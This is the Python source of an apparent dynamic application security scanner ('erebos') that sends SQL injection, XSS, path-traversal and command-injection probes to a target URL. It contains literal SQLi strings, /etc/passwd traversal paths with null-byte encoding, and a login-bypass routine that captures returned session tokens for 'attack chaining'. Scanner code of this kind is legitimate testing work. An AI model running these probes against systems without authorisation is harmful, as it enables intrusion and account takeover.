"""DAST Injection Executor — httpx-based injection testing.

SECURITY: This executor uses httpx DIRECTLY for all HTTP requests.
Payloads are NEVER passed through subprocess/shell arguments.
This is a mandatory mitigation for T-02 (Command Injection via payload construction).

Detection strategies:
1. Error-based: pattern matching against known DB error strings (regex from nuclei)
2. Auth bypass: POST login with SQLi → detect JWT/session in response
3. Boolean-blind: compare response size/content between true/false conditions
4. Time-based: measure response delay for sleep payloads
5. Path-segment traversal: inject in URL path with null-byte encoding
"""

import asyncio
import re
import time
from typing import Dict, List, Optional, Set
from urllib.parse import urlencode, urlparse

import httpx

from erebos.core.finding import Finding, FindingEvidence, Phase, Severity
from erebos.executors.payloads import sqli, xss, traversal, cmdi


class InjectionType:
    SQLI = "sqli"
    XSS = "xss"
    TRAVERSAL = "path_traversal"
    CMDI = "command_injection"
    AUTH_BYPASS = "auth_bypass"


class DastMode:
    """Controls execution depth."""

    FAST = "fast"  # Pattern matching only (no LLM, no nuclei)
    NUCLEI = "nuclei"  # Run nuclei templates via DastExecutor
    DEEP = "deep"  # LLM-adaptive via ExploitRole
    FULL = "full"  # fast → nuclei → deep (findings cascade)


# Maps injection type → (payloads, detection_patterns, cwe, severity)
INJECTION_CONFIG = {
    InjectionType.SQLI: {
        "payloads": sqli.ERROR_BASED + sqli.BOOLEAN_BLIND[:5],
        "patterns": sqli.ERROR_PATTERNS,
        "cwe": "CWE-89",
        "severity": Severity.HIGH,
        "title": "SQL Injection",
    },
    InjectionType.XSS: {
        "payloads": xss.REFLECTED[:8],
        "patterns": xss.REFLECTION_MARKERS,
        "cwe": "CWE-79",
        "severity": Severity.MEDIUM,
        "title": "Cross-Site Scripting (XSS)",
    },
    InjectionType.TRAVERSAL: {
        "payloads": traversal.UNIX_TRAVERSAL[:6] + traversal.WINDOWS_TRAVERSAL[:3],
        "patterns": traversal.SUCCESS_PATTERNS,
        "cwe": "CWE-22",
        "severity": Severity.HIGH,
        "title": "Path Traversal",
    },
    InjectionType.CMDI: {
        "payloads": cmdi.TIME_BLIND[:5],
        "patterns": cmdi.SUCCESS_PATTERNS,
        "cwe": "CWE-78",
        "severity": Severity.CRITICAL,
        "title": "Command Injection",
    },
}

# Regex patterns compiled from nuclei error-based SQLi template
_SQLI_REGEX_PATTERNS = [
    re.compile(r"SQL syntax.{0,500}?MySQL", re.I),
    re.compile(r"Warning.{0,500}?\Wmysqli?_", re.I),
    re.compile(r"MySQLSyntaxErrorException", re.I),
    re.compile(r"SQLSTATE\[\d+\]: Syntax error or access violation", re.I),
    re.compile(r"check the manual that (corresponds to|fits) your (MySQL|MariaDB)", re.I),
    re.compile(r"PostgreSQL.{0,500}?ERROR", re.I),
    re.compile(r"PG::SyntaxError:", re.I),
    re.compile(r"ERROR:\s+syntax error at or near", re.I),
    re.compile(r"Driver.{0,500}? SQL[\-\_\ ]*Server", re.I),
    re.compile(r"Unclosed quotation mark after the character string", re.I),
    re.compile(r"\bORA-\d{5}", re.I),
    re.compile(r"SQLITE_ERROR", re.I),
    re.compile(r"SQLite error \d+:", re.I),
    re.compile(r"sqlite3\.OperationalError:", re.I),
    re.compile(r"SequelizeDatabaseError", re.I),
    re.compile(r'near ".*": syntax error', re.I),
    re.compile(r"unrecognized token", re.I),
    re.compile(r"Dynamic SQL Error", re.I),
    re.compile(r"Unexpected end of command in statement", re.I),
]

# Common login/auth endpoints
_LOGIN_ENDPOINTS = [
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/login",
    "/api/v1/auth/login",
    "/auth/login",
    "/api/sessions",
]

# Common traversal path targets
_TRAVERSAL_PATHS = [
    "/ftp/package.json.bak%2500.md",
    "/ftp/eastere.gg%2500.md",
    "/ftp/acquisitions.md%2500.pdf",
    "/../etc/passwd",
    "/..%2f..%2f..%2fetc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]


class DastInjectionExecutor:
    """HTTP-based injection testing executor.

    Uses httpx directly — never delegates to CLI tools with payload arguments.
    Supports multiple detection strategies beyond simple pattern matching.
    """

    def __init__(
        self,
        timeout: float = 10.0,
        max_concurrent: int = 5,
        injection_types: Optional[List[str]] = None,
        follow_redirects: bool = True,
        mode: str = DastMode.FAST,
    ):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.injection_types = injection_types or [
            InjectionType.SQLI,
            InjectionType.XSS,
            InjectionType.TRAVERSAL,
            InjectionType.CMDI,
            InjectionType.AUTH_BYPASS,
        ]
        self.follow_redirects = follow_redirects
        self.mode = mode

    async def run(
        self,
        target: str,
        parameters: Optional[List[str]] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        login_endpoints: Optional[List[str]] = None,
        traversal_paths: Optional[List[str]] = None,
    ) -> List[Finding]:
        """Run injection tests against a target URL with parameters.

        Args:
            target: Base URL to test.
            parameters: Parameter names to inject into.
            method: HTTP method (GET or POST).
            headers: Additional headers.
            login_endpoints: Endpoints to test auth bypass against.
            traversal_paths: Specific paths to test for traversal.
        """
        if parameters is None:
            parameters = self._discover_params(target)
            if not parameters:
                parameters = ["id", "q", "search", "page", "file", "path", "url", "name"]

        findings: List[Finding] = []
        sem = asyncio.Semaphore(self.max_concurrent)

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=self.follow_redirects,
            verify=False,
        ) as client:
            tasks = []

            # Standard parameter injection tests
            for inj_type in self.injection_types:
                if inj_type == InjectionType.AUTH_BYPASS:
                    continue  # handled separately below
                config = INJECTION_CONFIG.get(inj_type)
                if not config:
                    continue
                for param in parameters:
                    for payload in config["payloads"]:
                        tasks.append(
                            self._test_injection(
                                client, sem, target, param, payload, method, headers, config
                            )
                        )

            # Auth bypass: POST JSON to login endpoints
            if InjectionType.AUTH_BYPASS in self.injection_types:
                endpoints = login_endpoints or _LOGIN_ENDPOINTS
                base = target.rstrip("/")
                for endpoint in endpoints:
                    for payload in sqli.AUTH_BYPASS:
                        tasks.append(
                            self._test_auth_bypass(client, sem, base + endpoint, payload, headers)
                        )

            # Path-segment traversal (not query param)
            if InjectionType.TRAVERSAL in self.injection_types:
                paths = traversal_paths or _TRAVERSAL_PATHS
                base = target.rstrip("/")
                for path in paths:
                    tasks.append(
                        self._test_path_traversal(client, sem, base + path, headers)
                    )

            # Boolean-blind SQLi: compare response length
            if InjectionType.SQLI in self.injection_types:
                for param in parameters[:3]:  # limit to avoid too many requests
                    tasks.append(
                        self._test_boolean_blind(client, sem, target, param, method, headers)
                    )

            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, Finding):
                    findings.append(result)

        return self._deduplicate(findings)

    async def _test_injection(
        self,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        target: str,
        param: str,
        payload: str,
        method: str,
        headers: Optional[Dict[str, str]],
        config: dict,
    ) -> Optional[Finding]:
        """Test a single injection payload against a parameter."""
        async with sem:
            try:
                start = time.monotonic()

                if method.upper() == "GET":
                    url = self._inject_param_url(target, param, payload)
                    resp = await client.get(url, headers=headers)
                else:
                    data = {param: payload}
                    resp = await client.post(target, data=data, headers=headers)

                elapsed = time.monotonic() - start
                body = resp.text

                # Strategy 1: Regex-based detection (from nuclei patterns)
                if config["cwe"] == "CWE-89":
                    for regex in _SQLI_REGEX_PATTERNS:
                        match = regex.search(body)
                        if match:
                            return Finding(
                                tool="erebos-dast",
                                severity=config["severity"],
                                title=f"{config['title']} in '{param}' parameter",
                                description=(
                                    f"Error-based {config['title']} detected in parameter "
                                    f"'{param}' at {target}. DB error pattern: {match.group()}"
                                ),
                                target=target,
                                evidence=FindingEvidence(
                                    url=str(resp.url),
                                    payload=payload,
                                    output=self._safe_excerpt(resp.text, match.group()),
                                ),
                                cwe=config["cwe"],
                                phase_found=Phase.VULN_SCAN,
                            )

                # Strategy 2: Simple string pattern matching (fallback)
                body_lower = body.lower()
                for pattern in config["patterns"]:
                    if pattern.lower() in body_lower:
                        return Finding(
                            tool="erebos-dast",
                            severity=config["severity"],
                            title=f"{config['title']} in '{param}' parameter",
                            description=(
                                f"Detected {config['title']} vulnerability in parameter "
                                f"'{param}' at {target}. The payload triggered a detectable "
                                f"response pattern."
                            ),
                            target=target,
                            evidence=FindingEvidence(
                                url=str(resp.url),
                                payload=payload,
                                output=self._safe_excerpt(resp.text, pattern),
                            ),
                            cwe=config["cwe"],
                            phase_found=Phase.VULN_SCAN,
                        )

                # Strategy 3: Time-based detection for cmdi/sqli
                if elapsed > 4.5 and config["cwe"] in ("CWE-78", "CWE-89"):
                    if "sleep" in payload.lower() or "waitfor" in payload.lower():
                        return Finding(
                            tool="erebos-dast",
                            severity=config["severity"],
                            title=f"Time-based {config['title']} in '{param}'",
                            description=(
                                f"Time-based blind {config['title']} detected in parameter "
                                f"'{param}'. Response delayed by {elapsed:.1f}s matching "
                                f"sleep payload timing."
                            ),
                            target=target,
                            evidence=FindingEvidence(
                                url=str(resp.url),
                                payload=payload,
                                output=f"Response time: {elapsed:.2f}s (expected ~5s delay)",
                            ),
                            cwe=config["cwe"],
                            phase_found=Phase.VULN_SCAN,
                        )

            except (httpx.TimeoutException, httpx.ConnectError):
                pass
            except Exception:
                pass

        return None

    async def _test_auth_bypass(
        self,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        url: str,
        payload: str,
        headers: Optional[Dict[str, str]],
    ) -> Optional[Finding]:
        """Test SQLi auth bypass by POSTing JSON with injected email/username."""
        async with sem:
            try:
                json_body = {"email": payload, "password": "anything"}
                hdrs = dict(headers or {})
                hdrs["Content-Type"] = "application/json"

                resp = await client.post(url, json=json_body, headers=hdrs)
                body = resp.text

                # Detect auth bypass: 200 + presence of token/authentication
                if resp.status_code == 200 and self._has_auth_token(body):
                    # Keep raw body in evidence for attack chaining (token extraction).
                    # The McpReporter sanitizes at report generation time (I-01).
                    return Finding(
                        tool="erebos-dast",
                        severity=Severity.CRITICAL,
                        title=f"SQL Injection Auth Bypass at {urlparse(url).path}",
                        description=(
                            f"Authentication bypass via SQL injection at {url}. "
                            f"The payload '{payload}' resulted in a successful login "
                            f"response containing an authentication token."
                        ),
                        target=url,
                        evidence=FindingEvidence(
                            url=url,
                            payload=payload,
                            output=body[:2000],
                        ),
                        cwe="CWE-89",
                        phase_found=Phase.VULN_SCAN,
                    )

                # Also check for SQL errors in login response
                for regex in _SQLI_REGEX_PATTERNS:
                    match = regex.search(body)
                    if match:
                        return Finding(
                            tool="erebos-dast",
                            severity=Severity.HIGH,
                            title=f"SQL Injection (error-based) at {urlparse(url).path}",
                            description=(
                                f"SQL error disclosed in login endpoint {url}. "
                                f"Pattern: {match.group()}"
                            ),
                            target=url,
                            evidence=FindingEvidence(
                                url=url,
                                payload=payload,
                                output=self._safe_excerpt(body, match.group()),
                            ),
                            cwe="CWE-89",
                            phase_found=Phase.VULN_SCAN,
                        )

            except (httpx.TimeoutException, httpx.ConnectError):
                pass
            except Exception:
                pass

        return None

    async def _test_path_traversal(
        self,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        url: str,
        headers: Optional[Dict[str, str]],
    ) -> Optional[Finding]:
        """Test path-segment traversal with null-byte and encoding bypasses."""
        async with sem:
            try:
                resp = await client.get(url, headers=headers)
                body = resp.text

                if resp.status_code == 200 and len(body) > 50:
                    # Check for file content indicators
                    indicators = [
                        "root:", "/bin/", "daemon:",  # /etc/passwd
                        '"name":', '"version":', '"description":',  # package.json
                        "<?xml", "<!DOCTYPE",  # config files
                    ]
                    for indicator in indicators:
                        if indicator in body:
                            return Finding(
                                tool="erebos-dast",
                                severity=Severity.HIGH,
                                title="Path Traversal (null-byte bypass)",
                                description=(
                                    f"Arbitrary file read via path traversal at {url}. "
                                    f"Null-byte or encoding bypass allowed access to "
                                    f"restricted file content."
                                ),
                                target=url,
                                evidence=FindingEvidence(
                                    url=url,
                                    payload=urlparse(url).path,
                                    output=body[:300],
                                ),
                                cwe="CWE-22",
                                phase_found=Phase.VULN_SCAN,
                            )

            except (httpx.TimeoutException, httpx.ConnectError):
                pass
            except Exception:
                pass

        return None

    async def _test_boolean_blind(
        self,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        target: str,
        param: str,
        method: str,
        headers: Optional[Dict[str, str]],
    ) -> Optional[Finding]:
        """Boolean-blind SQLi: compare responses between true/false conditions."""
        async with sem:
            try:
                # Send baseline request
                baseline_url = self._inject_param_url(target, param, "1")
                baseline_resp = await client.get(baseline_url, headers=headers)
                baseline_len = len(baseline_resp.text)

                # True condition
                true_url = self._inject_param_url(target, param, "1' OR '1'='1' --")
                true_resp = await client.get(true_url, headers=headers)
                true_len = len(true_resp.text)

                # False condition
                false_url = self._inject_param_url(target, param, "1' AND '1'='2' --")
                false_resp = await client.get(false_url, headers=headers)
                false_len = len(false_resp.text)

                # Detection: true response significantly different from false
                # AND true response different from baseline (not just ignoring input)
                if (
                    true_len != false_len
                    and true_len != baseline_len
                    and abs(true_len - false_len) > 50
                ):
                    return Finding(
                        tool="erebos-dast",
                        severity=Severity.HIGH,
                        title=f"Boolean-blind SQL Injection in '{param}'",
                        description=(
                            f"Boolean-blind SQLi detected in parameter '{param}' at {target}. "
                            f"True condition response ({true_len} bytes) differs significantly "
                            f"from false condition ({false_len} bytes) and baseline "
                            f"({baseline_len} bytes)."
                        ),
                        target=target,
                        evidence=FindingEvidence(
                            url=true_url,
                            payload="1' OR '1'='1' -- (true) vs 1' AND '1'='2' -- (false)",
                            output=(
                                f"Baseline: {baseline_len}B, "
                                f"True: {true_len}B, False: {false_len}B"
                            ),
                        ),
                        cwe="CWE-89",
                        phase_found=Phase.VULN_SCAN,
                    )

            except (httpx.TimeoutException, httpx.ConnectError):
                pass
            except Exception:
                pass

        return None

    def _has_auth_token(self, body: str) -> bool:
        """Detect authentication tokens in response body."""
        token_indicators = [
            '"token":', '"access_token":', '"authentication":', '"jwt":',
            '"sessionid":', '"session_id":', "eyJ",  # JWT prefix (base64 of {"...)
        ]
        body_lower = body.lower()
        for indicator in token_indicators:
            if indicator.lower() in body_lower:
                return True
        return False

    def _redact_token(self, body: str) -> str:
        """Redact actual token values from evidence (I-01 compliance)."""
        # Redact JWT-like tokens
        body = re.sub(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", "[JWT_REDACTED]", body)
        return body

    def _inject_param_url(self, target: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter safely (no shell involvement)."""
        separator = "&" if "?" in target else "?"
        return f"{target}{separator}{urlencode({param: payload})}"

    def _discover_params(self, target: str) -> List[str]:
        """Extract existing parameters from the URL."""
        parsed = urlparse(target)
        if parsed.query:
            params = []
            for part in parsed.query.split("&"):
                if "=" in part:
                    params.append(part.split("=")[0])
            return params
        return []

    def _safe_excerpt(self, body: str, pattern: str, context: int = 100) -> str:
        """Extract safe excerpt around matched pattern (max 200 chars)."""
        idx = body.lower().find(pattern.lower())
        if idx == -1:
            return body[:200]
        start = max(0, idx - context)
        end = min(len(body), idx + len(pattern) + context)
        return body[start:end]

    def _deduplicate(self, findings: List[Finding]) -> List[Finding]:
        """Remove duplicate findings (same CWE + same target + same payload)."""
        seen: Set[str] = set()
        unique: List[Finding] = []
        for f in findings:
            # Dedup by CWE + target + first 50 chars of payload
            payload_key = (f.evidence.payload or "")[:50] if f.evidence else ""
            key = f"{f.cwe}:{f.target}:{payload_key}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique
